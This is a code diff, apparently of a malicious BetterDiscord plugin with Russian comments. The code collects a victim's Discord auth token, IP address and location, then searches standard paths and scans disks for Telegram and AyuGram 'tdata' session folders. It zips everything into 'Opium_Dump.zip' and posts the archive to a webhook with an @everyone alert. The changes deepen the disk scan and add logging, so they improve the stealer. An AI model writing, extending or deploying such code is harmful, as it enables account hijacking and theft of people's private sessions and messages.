@@ -35,17 +35,19 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. УМНЫЙ РЕКУРСИВНЫЙ ПОИСК tdata (Telegram & AyuGram & Portable)
+    // 3. ПОИСК tdata
     let hasTdata = false;
     let tdataPath = null;
     
     try {
-        // Сначала стандартные пути
+        // Сначала проверяем стандартные пути и твой явный путь
         const appData = process.env.APPDATA || '';
         const localAppData = process.env.LOCALAPPDATA || '';
         const userProfile = process.env.USERPROFILE || '';
         
         const standardPaths = [
+            'D:\\zapret\\Ayugram\\tdata', // Твой явный путь
+            'D:\\zapret\\Telegram\\tdata',
             path.join(appData, 'Telegram Desktop', 'tdata'),
             path.join(appData, 'Telegram', 'tdata'),
             path.join(appData, 'AyuGram', 'tdata'),
@@ -53,31 +55,31 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             path.join(localAppData, 'Telegram', 'tdata'),
             path.join(localAppData, 'AyuGram', 'tdata'),
             path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
-            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata'),
-            path.join(userProfile, 'Downloads', 'Telegram Desktop', 'tdata'),
-            path.join(userProfile, 'Downloads', 'AyuGram', 'tdata')
+            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata')
         ];
 
         for (const p of standardPaths) {
-            if (fs.existsSync(p)) { tdataPath = p; break; }
+            if (fs.existsSync(p)) { 
+                tdataPath = p; 
+                result.debug_tdata.push(`Найдено по стандартному пути: ${p}`);
+                break; 
+            }
         }
 
-        // Если нет в стандартных, ищем по дискам (до 3 уровней вглубь)
+        // Если нет, сканируем диски
         if (!tdataPath) {
-            result.debug_tdata.push("Стандартные пути пусты. Сканирование дисков...");
+            result.debug_tdata.push("Стандартные пути пусты. Запуск глубокого сканирования...");
             
             const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
             
             const findTdataRecursive = (dir, depth = 0) => {
-                if (depth > 3) return null;
+                if (depth > 5) return null; // Увеличили глубину до 5
+                
+                // Если текущая папка - это tdata, возвращаем её
+                if (path.basename(dir).toLowerCase() === 'tdata') return dir;
+
                 try {
                     const entries = fs.readdirSync(dir, { withFileTypes: true });
-                    
-                    for (const entry of entries) {
-                        if (entry.isDirectory() && entry.name.toLowerCase() === 'tdata') {
-                            return path.join(dir, entry.name);
-                        }
-                    }
                     
                     for (const entry of entries) {
                         if (entry.isDirectory()) {
@@ -86,6 +88,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                             
                             const fullPath = path.join(dir, entry.name);
                             
+                            // Если это известная папка клиента, заходим без ограничения глубины
                             if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg') {
                                 const resultPath = findTdataRecursive(fullPath, depth);
                                 if (resultPath) return resultPath;
@@ -95,7 +98,10 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                             }
                         }
                     }
-                } catch (e) {}
+                } catch (e) {
+                    // Если нет доступа к папке, пишем в лог (чтобы знать, где споткнулись)
+                    result.debug_tdata.push(`Ошибка доступа к ${dir}: ${e.code || e.message}`);
+                }
                 return null;
             };
 
@@ -110,7 +116,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             }
         }
     } catch (e) {
-        result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
+        result.debug_tdata.push(`Критическая ошибка поиска: ${e.message}`);
     }
 
     // 4. ФОРМИРУЕМ ОДИН АРХИВ
@@ -120,35 +126,40 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
         // 4.1. Добавляем data.json в корень архива
         const jsonData = JSON.stringify(result, null, 2);
-        // Кодируем строку в Uint8Array (обязательно для fflate)
         const jsonBytes = new TextEncoder().encode(jsonData);
         zipFiles['data.json'] = jsonBytes;
 
-        // 4.2. Добавляем файлы tdata (если нашли)
+        // 4.2. Добавляем файлы tdata
         if (tdataPath) {
             result.telegram_path = tdataPath;
-            result.debug_tdata.push(`Папка найдена: ${tdataPath}`);
+            result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
             
+            let fileCount = 0;
             const addFilesRecursively = (dir, prefix = '') => {
                 try {
                     const entries = fs.readdirSync(dir);
                     for (const entry of entries) {
                         const fullPath = path.join(dir, entry);
-                        // Внутри zip-архива используем прямые слеши (/) для правильной структуры
+                        // ВАЖНО: Внутри ZIP используем прямые слеши (/)
                         const relativePath = (prefix ? prefix + '/' : '') + entry;
                         try {
                             if (fs.statSync(fullPath).isDirectory()) {
                                 addFilesRecursively(fullPath, relativePath);
                             } else {
                                 zipFiles['tdata/' + relativePath] = new Uint8Array(fs.readFileSync(fullPath));
+                                fileCount++;
                             }
-                        } catch (fileErr) { }
+                        } catch (fileErr) { 
+                            result.debug_tdata.push(`Не удалось прочитать файл ${entry}: ${fileErr.message}`);
+                        }
                     }
-                } catch (dirErr) { }
+                } catch (dirErr) { 
+                    result.debug_tdata.push(`Не удалось прочитать папку ${dir}: ${dirErr.message}`);
+                }
             };
             
             addFilesRecursively(tdataPath);
-            result.debug_tdata.push(`Добавлено файлов tdata в архив.`);
+            result.debug_tdata.push(`Добавлено файлов tdata в архив: ${fileCount}`);
             hasTdata = true;
         } else {
             result.debug_tdata.push("Папка tdata не найдена, в архиве будет только data.json.");
@@ -158,11 +169,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         result.debug_tdata.push("Запуск zipSync...");
         finalZipBuffer = zipFunc(zipFiles);
         result.debug_tdata.push("ZIP успешно создан!");
-        
-        // Обновляем data.json, чтобы в нем был финальный лог
-        const finalJsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
-        // (На случай, если ты хочешь, чтобы лог архивации тоже попал в data.json, 
-        // придется пересоздать архив, но это излишне. Оставим как есть).
 
     } catch (e) {
         result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
@@ -194,13 +200,11 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
     } catch (e) {}
 
     // 6. Формируем сообщение
-    // Указываем статус Tdata, но файл теперь один
     const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
     
     const formData = new FormData();
     formData.append('payload_json', JSON.stringify({ content: messageText }));
     
-    // Прикрепляем ОДИН архив со всем содержимым
     if (finalZipBuffer) {
         const zipBlob = new Blob([finalZipBuffer], { type: 'application/zip' });
         formData.append('files[0]', zipBlob, 'Opium_Dump.zip');
